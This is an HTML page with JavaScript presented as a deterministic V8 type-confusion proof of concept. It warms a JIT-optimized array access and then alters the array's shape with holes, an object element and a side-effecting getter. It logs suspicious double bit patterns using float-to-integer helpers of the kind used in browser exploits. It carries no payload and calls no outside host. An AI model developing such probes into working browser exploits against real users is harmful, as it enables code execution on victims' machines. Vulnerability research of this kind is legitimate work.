<!doctype html>
<meta charset="utf-8">
<title>V8 Type-Confusion Style PoC (Deterministic)</title>

<h3>Signal: inconsistent element interpretation (no exploit)</h3>
<pre id="log"></pre>

<script>
const log = m => {
  document.getElementById("log").textContent += m + "\n";
  console.log(m);
};

// helpers (observe bit patterns, not for exploitation)
function f2i(f) {
  const buf = new ArrayBuffer(8);
  new Float64Array(buf)[0] = f;
  return new BigUint64Array(buf)[0];
}
function i2f(i) {
  const buf = new ArrayBuffer(8);
  new BigUint64Array(buf)[0] = i;
  return new Float64Array(buf)[0];
}

// target kept simple
function vuln(a, i) {
  return a[i] + 1.1;
}

// warmup to get stable optimized path
function warmup() {
  const a = Array.from({length: 64}, (_, i) => i + 0.5); // doubles
  for (let k = 0; k < 120000; k++) {
    vuln(a, k & 63);
  }
  return a;
}

// deterministic shape change (no randomness)
function shapeFlip(a) {
  // create holes + shrink
  for (let i = 0; i < 8; i++) delete a[i];
  a.length = 16;

  // force object element
  a[2] = {x: 1};

  // side-effectful getter (deterministic)
  Object.defineProperty(a, 3, {
    get() {
      // controlled growth, no randomness
      a.push(13.37);
      a.push(14.47);
      return 1.1;
    }
  });

  return a;
}

// observation buffer (separate, just for stable readings)
const buf = new ArrayBuffer(0x1000);
const f64 = new Float64Array(buf);
for (let i = 0; i < f64.length; i++) f64[i] = i + 0.5;

function checkSignals(tag, a) {
  // read a few fixed indices only (deterministic)
  const idxs = [0,1,2,3,4,5,10,12];
  for (const i of idxs) {
    const v = a[i];
    if (typeof v === "number") {
      const bits = f2i(v).toString(16);
      // look for non-canonical double patterns (heuristic signal)
      if (!Number.isFinite(v) || (bits.startsWith("7ff") && !Number.isNaN(v))) {
        log(`[${tag}] suspicious number @${i} = ${v} bits=0x${bits}`);
      }
    } else if (typeof v === "object") {
      log(`[${tag}] object seen @${i}`);
    } else {
      log(`[${tag}] type=${typeof v} @${i}`);
    }
  }
}

function run() {
  log("[*] warmup");
  const base = warmup();

  log("[*] prepare copy");
  const a = base.slice();

  log("[*] flip shape deterministically");
  shapeFlip(a);

  log("[*] trigger optimized path");
  // fixed sequence (no random)
  for (let i = 0; i < 32; i++) vuln(a, i & 15);

  log("[*] observe signals");
  checkSignals("post-trigger", a);

  log("[*] done");
}

run();
</script>
